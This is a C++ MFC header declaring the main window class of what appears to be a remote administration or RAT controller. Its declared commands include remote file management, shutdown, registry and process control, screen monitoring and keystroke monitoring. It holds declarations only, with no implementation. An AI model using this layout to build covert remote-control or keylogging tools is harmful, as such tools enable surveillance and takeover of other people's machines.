// MainFrm.h : interface of the CMainFrame class
//
/////////////////////////////////////////////////////////////////////////////

#if !defined(AFX_MAINFRM_H__4920299B_DB96_403A_9D10_9315076E14A7__INCLUDED_)
#define AFX_MAINFRM_H__4920299B_DB96_403A_9D10_9315076E14A7__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "MyClientMainView.h"
#include "MyClientInfoView.h"
#include "MyHtmlView.h"
#include "MyEventView.h"
#include "NewMenu.h"

class CMainFrame : public CFrameWnd
{
	
DECLARE_DYNCREATE(CMainFrame)
public:

	CMainFrame();           // protected constructor used by dynamic creation
	~CMainFrame();

// Attributes
public:

// Operations
public:
	CSize LoadMyBitmap(UINT nID);
	void ResizeWnd();
	void DeleteCurItem();
	void ProcessCmd(SOCKET s,UINT Command,char *pExterndata,int len);
	void StopWork();
	void ShowMyText(LPCTSTR Text,BOOL Flag);
	void StartWork();

// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CMainFrame)
	protected:
	virtual BOOL OnCreateClient(LPCREATESTRUCT lpcs, CCreateContext* pContext);
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);
	//}}AFX_VIRTUAL

// Implementation
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif

protected:  // control bar embedded members

	CMyEventView		*pEventView;
	CMyClientMainView	*pClientListView;

	CStatusBar			m_wndStatusBar;
	CToolBar			m_wndToolBar;
	CNewMenu			m_MainMenu;
	CSplitterWnd		m_WndSplitter;
	CImageList			m_ToolBarList;
	SOCKET				m_MainSocket;

// Generated message map functions
protected:

	//{{AFX_MSG(CMainFrame)
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnClientCreate();
	afx_msg void OnClientFileManager();
	afx_msg void OnUpdateClientFileManager(CCmdUI* pCmdUI);
	afx_msg void OnClientPcRestart();
	afx_msg void OnUpdateClientPcRestart(CCmdUI* pCmdUI);
	afx_msg void OnClientPcShutdown();
	afx_msg void OnUpdateClientPcShutdown(CCmdUI* pCmdUI);
	afx_msg void OnClientProUninstall();
	afx_msg void OnUpdateClientProUninstall(CCmdUI* pCmdUI);
	afx_msg void OnGlobalSetup();
	afx_msg void OnHelp();
	afx_msg void OnAliveHelp();
	afx_msg void OnClose();
	afx_msg void OnUpdatePane(CCmdUI *pCmdUI);
	afx_msg void OnListDeleteItem();
	afx_msg void OnUpdateListDeleteItem(CCmdUI* pCmdUI);
	afx_msg void OnListEmptyItem();
	afx_msg void OnUpdateListEmptyItem(CCmdUI* pCmdUI);
	afx_msg void OnSaveListLog();
	afx_msg void OnUpdateSaveListLog(CCmdUI* pCmdUI);
	afx_msg void OnFrameMonitor();
	afx_msg void OnUpdateFrameMonitor(CCmdUI* pCmdUI);
	afx_msg void OnModifyTitle();
	afx_msg void OnUpdateModifyTitle(CCmdUI* pCmdUI);
	afx_msg void OnRegEdit();
	afx_msg void OnUpdateRegEdit(CCmdUI* pCmdUI);
	afx_msg void OnProc();
	afx_msg void OnUpdateProc(CCmdUI* pCmdUI);
	afx_msg void OnService();
	afx_msg void OnUpdateService(CCmdUI* pCmdUI);
	afx_msg void OnMulit();
	afx_msg void OnUpdateMulit(CCmdUI* pCmdUI);
	afx_msg void OnMonitorKey();
	afx_msg void OnUpdateMonitorKey(CCmdUI* pCmdUI);
	afx_msg void OnClientProxy();
	//}}AFX_MSG
	afx_msg LRESULT OnMyItemChanged(WPARAM wParam,LPARAM lParam);
	afx_msg LRESULT OnAddClient(WPARAM wParam,LPARAM lParam);
	afx_msg LRESULT OnCloseItem(WPARAM wParam,LPARAM lParam);
	afx_msg LRESULT OnMainRClick(WPARAM wParam,LPARAM lParam);
	DECLARE_MESSAGE_MAP()
public:
	void StartChildWork(LPCLIENTITEM pItem, char* pTitle, UINT nCmd, char* pExeName);
	afx_msg void OnTlnt();
	afx_msg void OnUpdateTlnt(CCmdUI *pCmdUI);
};

/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_MAINFRM_H__4920299B_DB96_403A_9D10_9315076E14A7__INCLUDED_)
